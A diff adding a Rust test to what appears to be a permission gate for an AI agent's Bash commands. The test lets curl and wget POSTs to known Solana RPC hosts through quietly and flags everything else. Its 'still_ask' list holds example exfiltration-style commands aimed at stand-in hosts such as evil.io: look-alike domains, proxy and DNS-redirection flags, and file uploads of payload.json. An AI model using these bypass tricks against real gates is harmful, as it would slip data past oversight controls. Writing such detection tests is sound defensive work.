@@ -1503,6 +1503,64 @@ fn f5_a_clean_pack_has_no_opinion_at_every_tier() {
 // ---------------------------------------------------------------------------------------
 // F4 (exfil tripwire): deferred out of this release (#19). No rows; the existing curl-POST
 // ask in gate-bash-secrets is pinned by its own suites.
-// TODO(#19): add the exfil rows (env -> network deny, quiet devnet JSON-RPC curl -d,
-// git push, anchor deploy) × 4 tiers here when the tripwire ships.
+// TODO(#19): add the exfil rows (env -> network deny, git push, anchor deploy) × 4 tiers here when the tripwire ships.
 // ---------------------------------------------------------------------------------------
+
+/// An inline JSON-RPC POST to a known Solana RPC host has no opinion below High and asks at
+/// High (deny headless at High; a no-opinion stays one headless).
+#[test]
+fn an_inline_post_to_a_solana_rpc_host_is_quiet_below_high() {
+    let w = World::new("rpc-post");
+    let body = r#"'{"jsonrpc":"2.0","id":1,"method":"getHealth"}'"#;
+    let quiet = [
+        format!("curl -X POST -d {body} https://api.devnet.solana.com"),
+        format!("curl -s -H 'Content-Type: application/json' -d {body} https://api.mainnet-beta.solana.com"),
+        format!("curl --data-raw {body} https://api.testnet.solana.com/"),
+        format!("curl -d {body} https://mainnet.helius-rpc.com/?api-key=abc"),
+        format!("curl -d {body} https://example.solana-mainnet.quiknode.pro/tok/"),
+        format!("curl -d {body} https://solana-mainnet.g.alchemy.com/v2/k"),
+        format!("curl -d {body} https://x.rpcpool.com"),
+        format!("curl -d {body} https://rpc.ankr.com/solana_devnet"),
+        format!("curl -d {body} https://solana-mainnet.api.syndica.io/api-key/k"),
+        format!("curl -d {body} https://solana-mainnet.rpc.extrnode.com"),
+        format!("wget -qO- --post-data={body} https://api.devnet.solana.com"),
+    ];
+    for cmd in &quiet {
+        check(cmd, w.x4("Bash", &bash(cmd)), ["", "", "", "ask"]);
+        check(
+            cmd,
+            w.x4_with("Bash", &bash(cmd), |t| Setup::at(t).headless()),
+            ["", "", "", "deny"],
+        );
+    }
+    // localhost stays allow-listed at every tier, as before.
+    let local = format!("curl -d {body} http://127.0.0.1:8899");
+    check(&local, w.x4("Bash", &bash(&local)), NO4);
+
+    // Everything else keeps the POST ask at every tier: file bodies, look-alike hosts, a second
+    // destination, redirection flags, an unparseable destination.
+    w.put("payload.json", "{}");
+    let still_ask = [
+        "curl -d @payload.json https://api.mainnet-beta.solana.com".to_string(),
+        "curl --data-binary @payload.json https://api.devnet.solana.com".to_string(),
+        "curl -T payload.json https://api.devnet.solana.com".to_string(),
+        "curl -F x=@payload.json https://api.devnet.solana.com".to_string(),
+        "curl --json @payload.json https://api.devnet.solana.com".to_string(),
+        format!("curl -d {body} https://api.devnet.solana.com.evil.io"),
+        format!("curl -d {body} https://evilhelius-rpc.com"),
+        format!("curl -d {body} https://evil.alchemy.com"),
+        format!("curl -d {body} https://api.devnet.solana.com@evil.io"),
+        format!("curl -d {body} https://api.devnet.solana.com https://evil.io"),
+        format!("curl -d {body} https://api.devnet.solana.com evil.io"),
+        format!("curl -d {body} --resolve api.devnet.solana.com:443:1.2.3.4 https://api.devnet.solana.com"),
+        format!("curl -d {body} -x http://evil.io:8080 https://api.devnet.solana.com"),
+        format!("curl -d {body} --connect-to ::evil.io: https://api.devnet.solana.com"),
+        format!("curl -d {body} -K cfg https://api.devnet.solana.com"),
+        format!("curl -d {body} https://api.devnet.solana.com --next -d x https://evil.io"),
+        format!("curl -d {body} $RPC"),
+        format!("curl -d {body} https://example.convex.cloud/api"),
+    ];
+    for cmd in &still_ask {
+        check(cmd, w.x4("Bash", &bash(cmd)), ["ask", "ask", "ask", "ask"]);
+    }
+}
